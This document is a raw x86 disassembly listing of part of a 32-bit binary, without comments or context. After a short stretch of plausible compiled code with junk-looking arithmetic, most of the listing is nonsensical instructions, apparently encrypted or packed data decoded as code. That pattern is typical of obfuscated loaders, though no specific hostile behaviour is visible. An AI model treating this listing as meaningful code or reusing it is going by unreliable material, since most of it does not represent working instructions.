  40cc5b:	xor    DWORD PTR ds:0x42a01c,0x42b018
  40cc65:	xor    eax,esi
  40cc67:	and    DWORD PTR ds:0x429014,0x42c01c
  40cc71:	push   edi
  40cc72:	mov    edi,0x3272ec
  40cc77:	add    eax,edi
  40cc79:	or     DWORD PTR ds:0x42b014,0x42a008
  40cc83:	mov    DWORD PTR [ebp-0x1c],eax
  40cc86:	sub    eax,DWORD PTR ds:0x42900c
  40cc8c:	mov    eax,DWORD PTR [ebp+0x14]
  40cc8f:	sbb    DWORD PTR ds:0x42c010,0x42d01c
  40cc99:	test   eax,eax
  40cc9b:	mov    DWORD PTR ds:0x42d018,0x202a
  40cca5:	je     0x40ccb9
  40ccab:	mov    eax,DWORD PTR [ebp+0x14]
  40ccae:	adc    ebx,0xa49
  40ccb4:	mov    eax,DWORD PTR [eax]
  40ccb6:	mov    DWORD PTR [ebp-0x1c],eax
  40ccb9:	mov    eax,DWORD PTR [ebp-0x4]
  40ccbc:	sub    ebx,0x2794
  40ccc2:	xor    eax,esi
  40ccc4:	mov    DWORD PTR ds:0x42c008,0x10
  40ccce:	cmp    DWORD PTR ds:0x42c008,0x0
  40ccd5:	je     0x40cd41
  40ccdb:	cmp    DWORD PTR ds:0x42c008,0x9
  40cce2:	jl     0x40cd41
  40cce8:	jmp    0x40cd13
  40cced:	push   0x3f9f
  40ccf2:	push   DWORD PTR [ebp-0x20]
  40ccf5:	push   DWORD PTR [ebp-0x24]
  40ccf8:	push   0x35ef
  40ccfd:	push   DWORD PTR [ebp-0x1c]
  40cd00:	push   DWORD PTR [ebp-0x14]
  40cd03:	push   0x24ee
  40cd08:	push   0x42f016
  40cd0d:	call   DWORD PTR ds:0x430047
  40cd13:	cmp    DWORD PTR ds:0x42c008,0xa
  40cd1a:	jne    0x40cd2f
  40cd20:	xor    ebx,ebx
  40cd22:	add    ebx,DWORD PTR ds:0x42c008
  40cd28:	dec    ebx
  40cd29:	mov    DWORD PTR ds:0x42c008,ebx
  40cd2f:	mov    ebx,DWORD PTR ds:0x42c008
  40cd35:	dec    ebx
  40cd36:	mov    DWORD PTR ds:0x42c008,ebx
  40cd3c:	jmp    0x40ccce
  40cd41:	add    eax,edi
  40cd43:	adc    ebx,0x57bc
  40cd49:	mov    DWORD PTR [ebp-0x8],eax
  40cd4c:	add    DWORD PTR ds:0x42a018,edi
  40cd52:	mov    eax,DWORD PTR [ebp-0xc]
  40cd55:	xor    eax,esi
  40cd57:	add    DWORD PTR ds:0x42c008,ebx
  40cd5d:	add    eax,edi
  40cd5f:	mov    DWORD PTR [ebp-0x24],eax
  40cd62:	mov    eax,ds:0x42a018
  40cd67:	add    DWORD PTR ds:0x42c000,eax
  40cd6d:	mov    eax,DWORD PTR [ebp-0x4]
  40cd70:	xor    DWORD PTR ds:0x429020,edi
  40cd76:	xor    eax,esi
  40cd78:	add    eax,edi
  40cd7a:	or     DWORD PTR ds:0x42b010,edx
  40cd80:	mov    DWORD PTR [ebp-0x30],eax
  40cd83:	mov    ebx,DWORD PTR [ebp-0x4]
  40cd86:	add    DWORD PTR ds:0x429018,0xc83
  40cd90:	jmp    0x40f126
  40cd95:	inc    edx
  40cd96:	mov    cl,dl
  40cd98:	rol    DWORD PTR [edx+0x31793981],0x8f
  40cd9f:	sti    
  40cda0:	jne    0x40cd8e
  40cda2:	xlat   BYTE PTR ds:[ebx]
  40cda3:	sub    eax,0x7aca47c7
  40cda8:	jp     0x40cdaf
  40cdaa:	pop    edi
  40cdab:	jp     0x40ce27
  40cdad:	les    esi,FWORD PTR [esp+ecx*2-0x107c3903]
  40cdb4:	fxch   st(5)
  40cdb6:	push   0x1fb155c
  40cdbb:	dec    ebp
  40cdbc:	cmp    DWORD PTR [ebx-0x39],0x88cad4b
  40cdc3:	and    bl,BYTE PTR [ecx+0x6c098e68]
  40cdc9:	scas   al,BYTE PTR es:[edi]
  40cdca:	ret    0x1621
  40cdcd:	lock hlt 
  40cdcf:	and    bh,BYTE PTR [ebx+ebp*2-0x69]
  40cdd3:	in     eax,dx
  40cdd4:	and    eax,0xf966a1c2
  40cdd9:	std    
  40cdda:	and    al,0xd4
  40cddc:	add    ecx,DWORD PTR ds:0xfd667bc3
  40cde2:	arpl   WORD PTR [ecx+0x31000f01],ax
  40cde8:	ja     0x40ce25
  40cdea:	call   0xb02da767
  40cdef:	mov    al,0x32
  40cdf1:	sub    ebx,eax
  40cdf3:	aad    0x78
  40cdf5:	mov    fs,WORD PTR [esp+ebp*4-0x5a3558b]
  40cdfc:	mov    edx,DWORD PTR [edi+eax*1+0x7c]
  40ce00:	test   DWORD PTR [ebp+eiz*4-0x7061b2d9],esp
  40ce07:	ja     0x40ce6c
  40ce09:	shl    BYTE PTR [ebx+0x62],cl
  40ce0c:	pop    ebp
  40ce0d:	xchg   edx,eax
  40ce0e:	lea    ecx,[eax+0x63]
  40ce11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce12:	mov    al,ds:0x8eb2e1e8
  40ce17:	add    BYTE PTR [ebp+0x76bd2b7a],0x6f
  40ce1e:	push   ebx
  40ce1f:	xchg   esp,eax
  40ce20:	rol    BYTE PTR [edi-0x5c],1
  40ce23:	inc    esi
  40ce24:	enter  0xd44b,0xd4
  40ce28:	adc    DWORD PTR [esi],ecx
  40ce2a:	das    
  40ce2b:	mov    esp,0x416663cd
  40ce30:	mov    ebp,0x7af1e66
  40ce35:	popa   
  40ce36:	out    0xe7,eax
  40ce38:	mov    ch,0x53
  40ce3a:	ficom  DWORD PTR [ecx+0x78]
  40ce3d:	pop    edx
  40ce3e:	pusha  
  40ce3f:	add    BYTE PTR [ecx+eax*4],dh
  40ce42:	aas    
  40ce43:	fwait
  40ce44:	aad    0xe2
  40ce46:	adc    BYTE PTR [edx],al
  40ce48:	fnstcw WORD PTR [edx]
  40ce4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce4b:	repz es out 0xdc,eax
  40ce4f:	mov    esi,0x4f9b02fb
  40ce54:	xchg   ebx,eax
  40ce55:	icebp  
  40ce56:	loopne 0x40cddc
  40ce58:	sub    bl,BYTE PTR [esi+0x4732eb05]
  40ce5e:	mov    esp,0x8919aae9
  40ce63:	jae    0x40ce23
  40ce65:	or     eax,0x2d119d9a
  40ce6a:	dec    ebp
  40ce6b:	mov    WORD PTR [ebx+0x55],?
  40ce6e:	retf   0x413f
  40ce71:	ror    BYTE PTR [ecx],0x70
  40ce74:	xchg   ebp,eax
  40ce75:	test   al,0x52
  40ce77:	arpl   WORD PTR [ebx],bx
  40ce79:	or     eax,0x1accda8a
  40ce7e:	inc    eax
  40ce7f:	xchg   edx,eax
  40ce80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce81:	pushf  
  40ce82:	test   BYTE PTR [esi+eiz*4],bh
  40ce85:	jle    0x40ceab
  40ce87:	or     BYTE PTR [ebx+0x4a539aa7],bh
  40ce8d:	mov    ecx,?
  40ce8f:	or     BYTE PTR [edi],dl
  40ce91:	lock out dx,eax
  40ce93:	mov    dl,0xa6
  40ce95:	jne    0x40cea2
  40ce97:	retf   0xb630
  40ce9a:	cld    
  40ce9b:	push   ebp
  40ce9c:	pop    eax
  40ce9d:	dec    esi
  40ce9e:	push   ecx
  40ce9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cea0:	leave  
  40cea1:	cld    
  40cea2:	pushf  
  40cea3:	jecxz  0x40ce56
  40cea5:	in     al,0x83
  40cea7:	xor    DWORD PTR [ecx+0x39],0x29
  40ceab:	les    esp,FWORD PTR [ebp-0x49]
  40ceae:	adc    eax,0xedb2d456
  40ceb3:	icebp  
  40ceb4:	fst    DWORD PTR [ecx+ebx*8]
  40ceb7:	loope  0x40cf28
  40ceb9:	adc    esi,DWORD PTR [eax+0x61d25e]
  40cebf:	jmp    0x7710:0x251bb07
  40cec6:	sub    BYTE PTR [esi],ah
  40cec8:	xchg   esp,eax
  40cec9:	out    0xe7,eax
  40cecb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cecc:	add    al,bh
  40cece:	ins    BYTE PTR es:[edi],dx
  40cecf:	imul   eax,DWORD PTR [esi],0x6e
  40ced2:	test   BYTE PTR [edi],cl
  40ced4:	dec    ebx
  40ced5:	lds    ecx,FWORD PTR [eax+0x26]
  40ced8:	cmp    esp,edi
  40ceda:	cmp    ebp,DWORD PTR [ebx+ebp*8+0x17cb78c9]
  40cee1:	shl    DWORD PTR [edx+ebp*1-0x73],1
  40cee5:	sbb    bh,BYTE PTR [edi]
  40cee7:	push   ebp
  40cee8:	and    al,0x60
  40ceea:	popf   
  40ceeb:	stc    
  40ceec:	daa    
  40ceed:	xchg   ebp,eax
  40ceee:	in     al,dx
  40ceef:	aad    0xd7
  40cef1:	mov    ecx,0xaf0ca1b
  40cef6:	ret    0xbc89
  40cef9:	pop    es
  40cefa:	adc    ebx,ecx
  40cefc:	push   es
  40cefd:	icebp  
  40cefe:	push   ecx
  40ceff:	outs   dx,DWORD PTR ds:[esi]
  40cf00:	cld    
  40cf01:	in     eax,dx
  40cf02:	cmp    eax,0xbccfc07b
  40cf07:	repnz stc 
  40cf09:	(bad)  
  40cf0a:	shr    BYTE PTR ss:[eax-0x259501e2],1
  40cf11:	push   esp
  40cf12:	ror    DWORD PTR [edx+0x1e],1
  40cf15:	loop   0x40cf74
  40cf17:	lock sbb al,bl
  40cf1a:	rcr    BYTE PTR [ebp+0x66],cl
  40cf1d:	mov    ds:0x51d46d07,al
  40cf22:	jns    0x40cf4c
  40cf24:	scas   al,BYTE PTR es:[edi]
  40cf25:	das    
  40cf26:	xor    eax,0x827caea1
  40cf2b:	aas    
  40cf2c:	hlt    
  40cf2d:	xor    al,0xf
  40cf2f:	shr    BYTE PTR [edi+ebx*1-0x658ff0d1],0x41
  40cf37:	add    eax,0x6b716d58
  40cf3c:	hlt    
  40cf3d:	mov    edx,0xfcae4932
  40cf42:	pop    edi
  40cf43:	mov    bh,dh
  40cf45:	pop    esi
  40cf46:	pusha  
  40cf47:	mov    bl,0x9e
  40cf49:	push   cs
  40cf4a:	in     eax,0x54
  40cf4c:	leave  
  40cf4d:	fwait
  40cf4e:	jg     0x40cfc1
  40cf50:	repz icebp 
  40cf52:	cmc    
  40cf53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf54:	fwait
  40cf55:	mov    ebp,0xa8d46767
  40cf5a:	pop    eax
  40cf5b:	mov    ch,0xf9
  40cf5d:	mov    ebx,0x3ccb4ffa
  40cf62:	iret   
  40cf63:	pop    ds
  40cf64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf65:	mov    ecx,0xd6dbbf23
  40cf6a:	mov    esi,0xe8e513ac
  40cf6f:	pop    edi
  40cf70:	mov    al,0xc6
  40cf72:	and    DWORD PTR [esp+eiz*2-0x6],0xf8ffc566
  40cf7a:	jbe    0x40cfa4
  40cf7c:	push   edx
  40cf7d:	xor    eax,0xa63f73c2
  40cf82:	sar    BYTE PTR [edx],cl
  40cf84:	pop    ecx
  40cf85:	sbb    al,0xd
  40cf87:	mov    eax,DWORD PTR [ecx+0x18]
  40cf8a:	loop   0x40cff2
  40cf8c:	std    
  40cf8d:	pop    es
  40cf8e:	add    ebx,DWORD PTR [ebp+0x385f732a]
  40cf94:	jnp    0x40cf93
  40cf96:	in     al,0x89
  40cf98:	cmp    dh,dl
  40cf9a:	cmp    BYTE PTR [esi+edi*8],ch
  40cf9d:	ja     0x40cf25
  40cf9f:	sbb    bh,0x2b
  40cfa2:	rcl    DWORD PTR [esi],0x4
  40cfa5:	fisub  WORD PTR [esi]
  40cfa7:	stc    
  40cfa8:	lahf   
  40cfa9:	shl    DWORD PTR [ebx],0x1f
  40cfac:	pushf  
  40cfad:	mov    al,ds:0xb95557bc
  40cfb2:	sub    BYTE PTR [ebx],cl
  40cfb4:	jmp    0x40cf49
  40cfb6:	addr16 hlt 
  40cfb8:	jmp    0xa0e2:0x65604d41
  40cfbf:	inc    edi
  40cfc0:	repz jbe 0x40cfa4
  40cfc3:	in     al,0x9d
  40cfc5:	mov    ebp,0x159cb0cf
  40cfca:	(bad)  
  40cfcc:	not    DWORD PTR [ebx+0x19]
  40cfcf:	clc    
  40cfd0:	popf   
  40cfd1:	inc    edi
  40cfd2:	push   ebx
  40cfd3:	xchg   ecx,eax
  40cfd4:	jmp    0x25a1:0xf01d57c5
  40cfdb:	retf   
  40cfdc:	nop
  40cfdd:	mov    edi,0xe8322a0
  40cfe2:	add    DWORD PTR [edx-0x1537863b],edx
  40cfe8:	das    
  40cfe9:	mov    esi,0x64a7ee09
  40cfee:	stos   DWORD PTR es:[edi],eax
  40cfef:	inc    esp
  40cff0:	test   DWORD PTR [esi],edi
  40cff2:	ja     0x40d039
  40cff4:	fsub   DWORD PTR [esi-0x53]
  40cff7:	mov    di,0xb126
  40cffb:	test   al,0x40
  40cffd:	adc    ebp,DWORD PTR [edi-0x1c]
  40d000:	in     eax,0x6
  40d002:	mov    bl,0x2d
  40d004:	rcr    BYTE PTR [ebx-0x53],1
  40d007:	cwde   
  40d008:	push   cs
  40d009:	ins    DWORD PTR es:[edi],dx
  40d00a:	cwde   
  40d00b:	and    DWORD PTR [eax+0x4ac7a90f],0xffffffe3
  40d012:	mov    eax,0x681ff116
  40d017:	sahf   
  40d018:	(bad)  
  40d019:	inc    ecx
  40d01a:	mov    bh,0xbc
  40d01c:	mov    dh,0xd8
  40d01e:	fwait
  40d01f:	jp     0x40d009
  40d021:	mov    eax,ds:0x690c4c08
  40d026:	sbb    al,bl
  40d028:	sbb    al,0xf
  40d02a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d02b:	jnp    0x40d063
  40d02d:	leave  
  40d02e:	ss mov ch,0x3c
  40d031:	js     0x40d07c
  40d033:	xchg   ebp,eax
  40d034:	mov    sp,0x65aa
  40d038:	jnp    0x40d05a
  40d03a:	ss xchg edi,eax
  40d03c:	(bad)  
  40d03d:	loopne 0x40d01a
  40d03f:	leave  
  40d040:	push   ds
  40d041:	clc    
  40d042:	imul   esp,DWORD PTR [edi+0x22],0x20
  40d046:	std    
  40d047:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d048:	or     edi,DWORD PTR [ebp-0x57]
  40d04b:	and    eax,0xf5c16c4b
  40d050:	lock xchg edx,eax
  40d052:	sbb    BYTE PTR [ebx+ebx*1],bl
  40d055:	icebp  
  40d056:	sbb    cl,BYTE PTR [ebx-0x6]
  40d059:	popa   
  40d05a:	mov    ebp,0x4d7aaff2
  40d05f:	jae    0x40cfe9
  40d061:	xor    DWORD PTR [edi-0x5697afaa],eax
  40d067:	cdq    
  40d068:	or     eax,0x456b5f8b
  40d06d:	test   dh,ah
  40d06f:	xlat   BYTE PTR ds:[ebx]
  40d070:	xlat   BYTE PTR ds:[ebx]
  40d071:	xor    BYTE PTR [eax+0x45],ch
  40d074:	or     cl,BYTE PTR [eax-0x1]
  40d077:	sub    edx,eax
  40d079:	sahf   
  40d07a:	mov    ebp,0x175d42
  40d07f:	or     al,bl
  40d081:	rdmsr  
  40d083:	out    dx,al
  40d084:	outs   dx,BYTE PTR ds:[esi]
  40d085:	mov    ecx,0xfc21fc61
  40d08a:	pop    ds
  40d08b:	jecxz  0x40d07e
  40d08d:	mov    edi,0x33e263ba
  40d092:	jbe    0x40d07c
  40d094:	cs scas eax,DWORD PTR es:[edi]
  40d096:	out    dx,al
  40d097:	pop    esi
  40d098:	jnp    0x40d095
  40d09a:	loop   0x40d051
  40d09c:	jnp    0x40d109
  40d09e:	inc    edi
  40d09f:	retf   0xbde5
  40d0a2:	mov    esp,DWORD PTR ds:0xd90211a4
  40d0a8:	(bad)  
  40d0a9:	push   es
  40d0aa:	(bad)
  40d0ad:	push   ss
  40d0ae:	xchg   esp,eax
  40d0af:	add    dh,BYTE PTR [edx+0x11]
  40d0b2:	ins    BYTE PTR es:[edi],dx
  40d0b3:	into   
  40d0b4:	fwait
  40d0b5:	lods   al,BYTE PTR ds:[esi]
  40d0b6:	jl     0x40d122
  40d0b8:	adc    eax,0x8c5a5039
  40d0bd:	out    0x4a,eax
  40d0bf:	jne    0x40d126
  40d0c1:	mov    ecx,0x134576eb
  40d0c6:	add    al,0x40
  40d0c8:	or     DWORD PTR [ebx+esi*8],ebp
  40d0cb:	inc    ecx
  40d0cc:	mov    cl,0xc1
  40d0ce:	xor    ecx,DWORD PTR [ebp+0x60]
  40d0d1:	ret    0x883b
  40d0d4:	fwait
  40d0d5:	jmp    FWORD PTR ds:0x751d54c7
  40d0db:	aam    0x99
  40d0dd:	pusha  
  40d0de:	add    al,0x41
  40d0e0:	shl    BYTE PTR [edx],1
  40d0e2:	adc    ebp,DWORD PTR [edx+0x10]
  40d0e5:	mov    esi,0xaf124a20
  40d0ea:	mov    ch,cl
  40d0ec:	test   edx,0x79e321b3
  40d0f2:	mov    ah,0x1d
  40d0f4:	sbb    al,0x97
  40d0f6:	xor    BYTE PTR [esi+0x6d],al
  40d0f9:	hlt    
  40d0fa:	ds xor al,0x3f
  40d0fd:	dec    cl
  40d0ff:	push   ebx
  40d100:	pop    es
  40d101:	es jge 0x40d08e
  40d104:	aam    0x94
  40d106:	mov    ds,WORD PTR [edi]
  40d108:	pop    ss
  40d109:	adc    eax,0xf2fb56d1
  40d10e:	dec    eax
  40d10f:	mov    al,0xaa
  40d111:	xlat   BYTE PTR ds:[ebx]
  40d112:	push   ecx
  40d113:	call   0xcb00:0x14f5e946
  40d11a:	out    dx,eax
  40d11b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d11c:	inc    ebp
  40d11d:	stos   DWORD PTR es:[edi],eax
  40d11e:	cmc    
  40d11f:	test   al,0x14
  40d121:	or     DWORD PTR [edx-0x7ec33608],edi
  40d127:	fwait
  40d128:	dec    esp
  40d129:	retf   0xb8e3
  40d12c:	mov    edx,0x96a75f10
  40d131:	cmp    DWORD PTR [edi+ebx*1-0x8],0xfffffffb
  40d136:	fwait
  40d137:	xchg   DWORD PTR [ecx+0xa941123],ecx
  40d13d:	fst    QWORD PTR [eax]
  40d13f:	sub    bl,dl
  40d141:	out    0x8b,al
  40d143:	jle    0x40d0e0
  40d145:	mov    ecx,0x59480f2a
  40d14a:	icebp  
  40d14b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d14c:	or     ebx,DWORD PTR [edx+0x78]
  40d14f:	mov    esi,0xd8200976
  40d154:	mov    eax,gs
  40d156:	or     eax,0x3df0c25a
  40d15b:	jns    0x40d151
  40d15d:	in     eax,0xf0
  40d15f:	lahf   
  40d160:	ret    
  40d161:	jmp    DWORD PTR [ecx-0x1a560bc0]
  40d167:	pop    ss
  40d168:	loope  0x40d196
  40d16a:	aam    0x8f
  40d16c:	push   ds
  40d16d:	xlat   BYTE PTR ds:[ebx]
  40d16e:	cmp    eax,0x3893df30
  40d173:	adc    esi,edi
  40d175:	or     BYTE PTR [edi],dh
  40d177:	xor    dh,BYTE PTR [ebp+0x7]
  40d17a:	cmp    al,0xdc
  40d17c:	xchg   BYTE PTR [ebp-0x3a69eb11],bh
  40d182:	mov    edi,0xa852ee03
  40d187:	pusha  
  40d188:	xchg   DWORD PTR [edi-0x7da7cfc0],edi
  40d18e:	addr16 push ss
  40d190:	stc    
  40d191:	ret    
  40d192:	xchg   esp,eax
  40d193:	stc    
  40d194:	add    esi,ebp
  40d196:	mov    ecx,0x38c80a8
  40d19b:	or     BYTE PTR [edi+0x15],dh
  40d19e:	adc    cl,BYTE PTR [ebx+0x84114f]
  40d1a4:	xor    BYTE PTR [eax],0x9b
  40d1a7:	sub    al,0x8c
  40d1a9:	cmp    eax,0x139f2e15
  40d1ae:	jl     0x40d14d
  40d1b0:	or     al,0xd4
  40d1b2:	push   ebx
  40d1b3:	fmul   DWORD PTR [ecx+0x447c6d00]
  40d1b9:	cwde   
  40d1ba:	mov    dh,0x81
  40d1bc:	and    al,0x33
  40d1be:	mov    dl,0x8d
  40d1c0:	fistp  DWORD PTR [ebx]
  40d1c2:	enter  0x6931,0x26
  40d1c6:	cmp    BYTE PTR [ebx],0xfc
  40d1c9:	xor    BYTE PTR [esi+ecx*2],cl
  40d1cc:	pop    ebx
  40d1cd:	std    
  40d1ce:	and    edx,ecx
  40d1d0:	mov    edx,0x4a99dd9e
  40d1d5:	push   eax
  40d1d6:	mov    DWORD PTR [edx+edi*1],eax
  40d1d9:	in     eax,dx
  40d1da:	pop    ebx
  40d1db:	mov    bh,BYTE PTR [esi+0x76]
  40d1de:	push   edx
  40d1df:	ficom  DWORD PTR [eax+0x1566ec3b]
  40d1e5:	fucomi st,st(5)
  40d1e7:	inc    esp
  40d1e8:	push   ebx
  40d1e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1ea:	jge    0x40d24d
  40d1ec:	leave  
  40d1ed:	or     DWORD PTR [ecx],ebx
  40d1ef:	sub    ecx,0xe4fa3f40
  40d1f5:	dec    ecx
  40d1f6:	loop   0x40d234
  40d1f8:	ror    BYTE PTR [ebx+0x16],cl
  40d1fb:	rcl    BYTE PTR [esi+0x60],0x50
  40d1ff:	jns    0x40d1ba
  40d201:	jge    0x40d19b
  40d203:	add    eax,0xb26ac7eb
  40d208:	mov    esp,0xbcc08566
  40d20d:	gs push es
  40d20f:	mov    ecx,ebx
  40d211:	inc    edi
  40d212:	mov    ecx,0x9c356b47
  40d217:	fisubr DWORD PTR [ebx+0x79389d6f]
  40d21d:	imul   esi,esp,0x73
  40d220:	(bad)  
  40d221:	fisttp QWORD PTR ds:0x93b432d0
  40d227:	dec    eax
  40d228:	mov    ds:0xa421ca02,eax
  40d22d:	leave  
  40d22e:	in     eax,0x42
  40d230:	retf   0xf048
  40d233:	repz sbb ebx,DWORD PTR [esi-0x4f6b2fac]
  40d23a:	data16 mov WORD PTR [edi-0x72],?
  40d23e:	inc    edi
  40d23f:	movzx  esp,BYTE PTR [eax+0x3ec9c200]
  40d246:	pusha  
  40d247:	or     DWORD PTR [edx+0x2e70363c],eax
  40d24d:	jno    0x40d1e8
  40d24f:	cmp    eax,0x2ae9288f
  40d254:	nop
  40d255:	mov    ebp,0xcafbe802
  40d25a:	dec    edi
  40d25b:	inc    esp
  40d25c:	sub    bh,bh
  40d25e:	in     eax,0x65
  40d260:	ds adc eax,0x900fb718
  40d266:	gs inc edi
  40d268:	mov    bl,0x1e
  40d26a:	retf   0xbaad
  40d26d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d26e:	and    bl,cl
  40d270:	mov    ebx,0xd459235b
  40d275:	shr    BYTE PTR [edi+0x54],1
  40d278:	mov    al,0x3a
  40d27a:	fadd   DWORD PTR [ebp+0x2af17ca0]
  40d280:	pop    ecx
  40d281:	neg    BYTE PTR [ecx]
  40d283:	repz idiv BYTE PTR [edx+0x18c3309]
  40d28a:	in     eax,0xbc
  40d28c:	xchg   BYTE PTR [ebp-0x441edeed],bh
  40d292:	inc    ebx
  40d293:	cld    
  40d294:	idiv   BYTE PTR [ebx]
  40d296:	xchg   DWORD PTR [ecx+0x2fe32bea],esp
  40d29c:	loope  0x40d2c7
  40d29e:	sbb    al,0xc2
  40d2a0:	mov    eax,ds:0x992bcdcf
  40d2a5:	daa    
  40d2a6:	or     al,0x68
  40d2a8:	fs jle 0x40d2a3
  40d2ab:	test   al,0xd
  40d2ad:	hlt    
  40d2ae:	mov    bh,0xec
  40d2b0:	inc    edi
  40d2b1:	outs   dx,DWORD PTR ds:[esi]
  40d2b2:	or     eax,0x6f6595cf
  40d2b7:	jle    0x40d308
  40d2b9:	pusha  
  40d2ba:	iret   
  40d2bb:	pusha  
  40d2bc:	outs   dx,DWORD PTR ds:[esi]
  40d2bd:	add    esi,DWORD PTR [eax+0x5f35de0c]
  40d2c3:	in     eax,0xc0
  40d2c5:	aaa    
  40d2c6:	adc    eax,0xd3931b7f
  40d2cb:	mov    eax,ds:0xc089b66a
  40d2d0:	pop    edi
  40d2d1:	push   ebp
  40d2d2:	mov    al,0x21
  40d2d4:	into   
  40d2d5:	sbb    al,0x28
  40d2d7:	ins    BYTE PTR es:[edi],dx
  40d2d8:	les    edx,FWORD PTR [ecx-0x6f8a0845]
  40d2de:	out    0x65,eax
  40d2e0:	out    0x41,al
  40d2e2:	jg     0x40d2ee
  40d2e4:	cmp    eax,0x3f6bc0cb
  40d2e9:	cld    
  40d2ea:	mov    esp,0xcc227943
  40d2ef:	cli    
  40d2f0:	push   cs
  40d2f1:	je     0x40d32b
  40d2f3:	repnz in al,dx
  40d2f5:	sbb    eax,0x7d804d65
  40d2fa:	fs icebp 
  40d2fc:	push   cs
  40d2fd:	sahf   
  40d2fe:	inc    esp
  40d2ff:	xor    BYTE PTR [eax],dl
  40d301:	pusha  
  40d302:	or     BYTE PTR [ebx+0x1a],0x7b
  40d306:	lds    eax,FWORD PTR [eax]
  40d308:	push   edi
  40d309:	and    dl,BYTE PTR [ebx+0x52]
  40d30c:	xor    eax,DWORD PTR [ecx+0xaceedcd]
  40d312:	add    al,0xf
  40d314:	stos   BYTE PTR es:[edi],al
  40d315:	xlat   BYTE PTR ds:[ebx]
  40d316:	mov    bh,0xfe
  40d318:	xor    ebx,DWORD PTR [eax-0x1ac17f07]
  40d31e:	retf   0x441b
  40d321:	or     BYTE PTR [eax+esi*4],dl
  40d324:	push   cs
  40d325:	sbb    BYTE PTR [ebx+0xb],dl
  40d328:	sub    edx,DWORD PTR [ebx+0x3e]
  40d32b:	sub    edx,eax
  40d32d:	inc    eax
  40d32e:	shr    DWORD PTR [ebp-0x1325722c],1
  40d334:	in     al,dx
  40d335:	fs xor al,0xe1
  40d338:	outs   dx,DWORD PTR ds:[esi]
  40d339:	jmp    0x40d399
  40d33b:	and    cl,BYTE PTR [ecx-0x65]
  40d33e:	inc    ebx
  40d33f:	mov    bl,0xee
  40d341:	pop    ebp
  40d342:	sbb    esi,DWORD PTR [esp+ebp*8]
  40d345:	sbb    al,0x44
  40d348:	mov    cl,BYTE PTR [ebx+eiz*2-0x55]
  40d34c:	cwde   
  40d34d:	xor    eax,DWORD PTR [ebp-0x51]
  40d350:	pop    esi
  40d351:	inc    esi
  40d352:	push   eax
  40d353:	pop    ss
  40d354:	data16 adc al,0xd8
  40d357:	hlt    
  40d358:	dec    eax
  40d359:	add    dl,al
  40d35b:	adc    al,BYTE PTR [ebx+eax*4-0x5bfd83c5]
  40d362:	mov    edi,ecx
  40d364:	data16 fdiv st(3),st
  40d367:	push   edx
  40d368:	push   esi
  40d369:	addr16 (bad) 
  40d36b:	cli    
  40d36c:	out    0x12,al
  40d36e:	and    al,0xce
  40d370:	push   0x767f2043
  40d375:	cmp    DWORD PTR [ecx+0x3017e176],edx
  40d37b:	sub    cl,BYTE PTR [esi-0x7a]
  40d37e:	mov    WORD PTR [esi+0x39],?
  40d381:	pop    ebp
  40d382:	rcl    BYTE PTR [ecx+0x73],0x57
  40d386:	and    ecx,DWORD PTR ds:0xe874a294
  40d38c:	and    al,0xd5
  40d38e:	(bad)  
  40d38f:	or     DWORD PTR [ecx],ecx
  40d391:	arpl   di,di
  40d393:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d394:	ins    DWORD PTR es:[edi],dx
  40d395:	mov    ebp,ecx
  40d397:	loope  0x40d396
  40d399:	jns    0x40d381
  40d39b:	jg     0x40d404
  40d39d:	mov    ds:0x1b291102,eax
  40d3a2:	mov    bl,0xc2
  40d3a4:	xchg   ecx,eax
  40d3a5:	shl    DWORD PTR [ecx+0x22],cl
  40d3a8:	(bad)  
  40d3a9:	mov    edx,0xd116230
  40d3ae:	push   0xffffff98
  40d3b0:	add    eax,0x520f614d
  40d3b5:	ja     0x40d399
  40d3b7:	inc    esi
  40d3b8:	sbb    DWORD PTR [edx+0x27de98a9],ebx
  40d3be:	leave  
  40d3bf:	adc    BYTE PTR ds:0x5635b26e,bl
  40d3c5:	(bad)  
  40d3c6:	(bad)  
  40d3c7:	jmp    0x7ffa:0x56ab474a
  40d3ce:	mov    edi,0xad102411
  40d3d3:	sbb    eax,0x4e8bab4b
  40d3d8:	push   0xffffff87
  40d3da:	dec    ebx
  40d3db:	sbb    esp,DWORD PTR ds:0xd3e21033
  40d3e1:	xor    al,0x8c
  40d3e3:	sub    ecx,esi
  40d3e5:	push   cs
  40d3e6:	repz in eax,0x29
  40d3e9:	scas   eax,DWORD PTR es:[edi]
  40d3ea:	xchg   esi,eax
  40d3eb:	out    0x4d,al
  40d3ed:	add    eax,0x3c9a8293
  40d3f2:	jno    0x40d45a
  40d3f4:	xchg   ebx,eax
  40d3f5:	xchg   BYTE PTR [ecx-0x56],bh
  40d3f8:	dec    eax
  40d3f9:	sbb    BYTE PTR [ebx+0x6634d319],bh
  40d3ff:	ins    DWORD PTR es:[edi],dx
  40d400:	stos   DWORD PTR es:[edi],eax
  40d401:	popa   
  40d402:	mov    al,0x22
  40d404:	ret    
  40d405:	jmp    FWORD PTR [esi-0x568e24f9]
  40d40b:	adc    bl,BYTE PTR [edx+edi*4+0x65]
  40d40f:	inc    esi
  40d410:	sbb    DWORD PTR [ebx+0x3b81fcd1],edx
  40d416:	pop    ebx
  40d417:	dec    ebp
  40d418:	sub    esp,ebx
  40d41a:	sbb    eax,0x7b7109d5
  40d41f:	mov    ah,BYTE PTR [edx]
  40d421:	push   esi
  40d422:	mov    al,ds:0xfa304c2c
  40d427:	je     0x40d484
  40d429:	add    eax,DWORD PTR [edx]
  40d42b:	loop   0x40d433
  40d42d:	loopne 0x40d3b6
  40d42f:	ja     0x40d4a8
  40d431:	out    dx,eax
  40d432:	imul   esp,DWORD PTR [edi+0x3b],0x18
